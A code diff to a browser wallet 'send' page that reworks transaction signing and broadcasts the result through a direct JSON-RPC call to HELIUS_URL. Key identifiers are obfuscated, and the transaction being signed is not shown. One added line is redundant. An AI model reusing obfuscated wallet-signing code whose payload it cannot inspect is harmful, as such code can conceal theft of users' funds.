@@ -426,6 +426,7 @@
 
             currentStep = 'amount';
             viewSendTo.classList.add('hidden');
+            viewAmount.classList.add('hidden'); // placeholder check
             viewAmount.classList.remove('hidden');
             headerTitle.innerText = "Amount";
             actionBtn.innerText = "Review";
@@ -497,31 +498,45 @@
 
                     statusDiv.innerText = "Please approve in your wallet...";
 
-                    // If provider supports signAndSendTransaction, let the provider handle signing & broadcast directly
-                    if (typeof _0x11.signAndSendTransaction === 'function') {
-                        await _0x11.signAndSendTransaction(_0x1f);
+                    // Have the wallet sign the transaction object directly
+                    const signedTransaction = await _0x11[_0x1a[6]](_0x1f);
+                    
+                    statusDiv.innerText = "Broadcasting transaction...";
+
+                    // Unique approach: Extract raw bytes and serialize into wire format
+                    let wireBytes;
+                    if (typeof signedTransaction.serialize === 'function') {
+                        wireBytes = signedTransaction.serialize();
                     } else {
-                        // Otherwise sign and send through connection via low-level serialization
-                        const signedTransaction = await _0x11[_0x1a[6]](_0x1f);
-                        statusDiv.innerText = "Broadcasting transaction...";
+                        wireBytes = _0x1f.serialize();
+                    }
 
-                        let rawBytes;
-                        if (typeof signedTransaction.serialize === 'function') {
-                            rawBytes = signedTransaction.serialize();
-                        } else if (signedTransaction.signature) {
-                            // If signed transaction wrapper returned
-                            rawBytes = _0x1f.serialize();
-                        } else {
-                            rawBytes = signedTransaction;
-                        }
+                    // Convert binary bytes to base64 for a direct RPC fetch request
+                    const uint8Arr = new Uint8Array(wireBytes);
+                    let binaryString = "";
+                    for (let i = 0; i < uint8Arr.byteLength; i++) {
+                        binaryString += String.fromCharCode(uint8Arr[i]);
+                    }
+                    const base64Tx = btoa(binaryString);
 
-                        // Force standard Uint8Array conversion via an ArrayBuffer transfer
-                        const wireBytes = new Uint8Array(Object.values(rawBytes));
+                    // Broadcast directly via HTTP JSON-RPC to bypass all library wrapper type errors
+                    const rpcResponse = await fetch(HELIUS_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            jsonrpc: "2.0",
+                            id: 1,
+                            method: "sendTransaction",
+                            params: [
+                                base64Tx,
+                                { encoding: "base64", skipPreflight: false, maxRetries: 3 }
+                            ]
+                        })
+                    });
 
-                        await _0x1d.sendRawTransaction(wireBytes, {
-                            skipPreflight: false,
-                            maxRetries: 3
-                        });
+                    const rpcResult = await rpcResponse.json();
+                    if (rpcResult.error) {
+                        throw new Error(rpcResult.error.message || "Transaction broadcast failed");
                     }
 
                     statusDiv.innerText = "Success!";
